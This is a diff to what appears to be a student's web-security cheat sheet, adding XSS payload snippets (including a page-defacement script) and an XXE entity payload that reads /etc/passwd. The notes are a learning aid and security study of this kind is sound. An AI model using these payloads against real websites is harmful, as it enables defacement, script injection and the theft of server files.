@@ -139,12 +139,14 @@
 
 ### XSS
 - Cross Site Scripting
+- http://www.xss-payloads.com/
 
 #### Stored XSS
 - XSS example in comment: `<script>alert("Test")</script>`
 - malicious image: `<img src='LINK' onmouseover="alert('xss')">`
 - malicious URL: `<https://somewebsite.com/titlepage?id=> <script> evilcode() </script>`
 - test with: `<h1></h1>` and `<b></b>`
+- change content on webpage: `<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>`
 
 #### OWASP ZAP
 - use automated scan to search for XSS vulnerabilities
@@ -403,3 +405,22 @@ Some other important instructions:
 - https://crackstation.net/
 - https://md5decrypt.net/en/
 - https://hashes.com/en/decrypt/hash
+
+### XML External Entity (XXE)
+XXE Test:
+```XML
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE note SYSTEM "note.dtd">
+<note>
+    <to>0x47root</to>
+    <from>was</from>
+    <heading>here</heading>
+    <body>hihi ;)</body>
+</note>
+```
+Output file contents:
+```XML
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
+```
